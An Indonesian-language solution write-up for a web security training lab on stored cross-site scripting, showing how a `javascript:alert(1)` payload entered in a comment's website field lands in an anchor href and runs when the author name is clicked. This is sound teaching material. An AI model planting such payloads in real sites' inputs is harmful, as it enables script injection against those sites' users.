# Stored XSS into anchor `href` attribute with double quotes HTML-encoded

Lab ini berisi kerentanan **stored cross-site scripting (XSS)** pada fitur komentar. Untuk menyelesaikan lab ini, kirim komentar yang memanggil fungsi **`alert`** ketika nama penulis komentar diklik.

## Solusi

1. Posting komentar dengan string alfanumerik acak pada input **"Website"**,contohnya `TESTING123`.

2. Buat request kedua di browser untuk melihat postingan tersebut.


3. Perhatikan bahwa string acak telah direfleksikan di dalam attribute **anchor `href`**.


```html
<section class="comment">
<p>
<img src="/resources/images/avatarDefault.svg" class="avatar">
<a id="author" href="https://tes.com">testing</a> | 15 June 2026
</p>
<p>TESTING123</p>
<p></p>
</section>
```

4. Ulangi proses tersebut, tetapi kali ini ganti input kamu dengan payload berikut untuk menyisipkan **JavaScript URL** yang memanggil `alert`:

```javascript
javascript:alert(1)
```

5. Perhatikan sakarang kolom nama sudah ada  `href` denga nilai `javascript:alert(1)`

```html
<section class="comment">
<p>
<img src="/resources/images/avatarDefault.svg" class="avatar">                            
<a id="author" href="javascript:alert(1)">testing</a> | 15 June 2026
</p>
<p>TESTING123</p>
<p></p>
</section>
```

6. Verifikasi bahwa teknik tersebut berhasil dengan klik kanan, pilih **"Copy URL"**, lalu tempel URL tersebut di browser. Mengklik nama di atas komentar kamu harus memicu **alert**.
